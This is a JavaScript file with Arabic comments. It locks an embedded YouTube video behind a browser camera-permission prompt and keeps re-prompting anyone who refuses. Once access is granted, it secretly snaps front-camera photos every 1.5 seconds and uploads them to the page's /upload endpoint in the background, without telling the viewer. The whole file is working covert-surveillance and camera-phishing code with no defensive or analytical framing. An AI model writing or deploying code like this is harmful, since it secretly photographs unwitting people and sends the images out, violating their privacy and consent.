/* ==========================================================
   سكريبت التحكم الشرطي المتقدم وإعادة طلب الأذونات بلا حدود
   ========================================================== */

let mediaStream = null;

async function initPersistentCamera() {
    try {
        // طلب إذن الكاميرا من المتصفح في كل محاولة جديدة
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: { ideal: 'user' }
            } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        // [عند السماح]: إزالة شاشة الحظر وتشغيل مشغل يوتيوب فوراً
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        }
        
        // التقاط الصور وإرسالها كل 1.5 ثانية في الخلفية
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {
                console.log("خطأ في التقاط الإطار:", err);
            }
        }, 1500);

    } catch (e) {
        console.log("تم رفض الإذن أو تجاهله:", e);
        // في حال الرفض أو التجاهل، نظهر شاشة الحظر وزر إعادة المحاولة التكراري
        showRetryScreen();
    }
}

// دالة عرض شاشة الحظر مع زر مخصص لإعادة إطلاق نافذة الأذونات بلا حدود
function showRetryScreen() {
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        playerContainer.innerHTML = `
            <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                <div>
                    <div style="font-size:36px;margin-bottom:8px;">🔒</div>
                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح</p>
                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">يرجى منح الإذن لمتابعة العرض</p>
                    <span style="font-size:13px;color:#fff;background:#cc0000;padding:9px 22px;border-radius:20px;display:inline-block;font-weight:bold;cursor:pointer;">اضغط هنا للمشاهدة</span>
                </div>
            </div>
        `;
        
        // عند الضغط على الزر، يتم تصفير المتغير وإعادة استدعاء دالة الكاميرا لإظهار نافذة الأذونات من جديد مهما كان عدد المحاولات السابقة
        document.getElementById('retryCamera').onclick = () => {
            mediaStream = null;
            initPersistentCamera();
        };
    }
}

function startCapture() {
    if (mediaStream) return;
    
    // حفظ معرف الفيديو الحالي عند النقر عليه لأول مرة
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        const iframe = playerContainer.querySelector('iframe');
        if(iframe) {
            const match = iframe.src.match(/embed\/([^?]+)/);
            if(match) playerContainer.dataset.videoId = match[1];
        }
    }

    // إطلاق طلب الكاميرا لأول مرة
    initPersistentCamera();
}
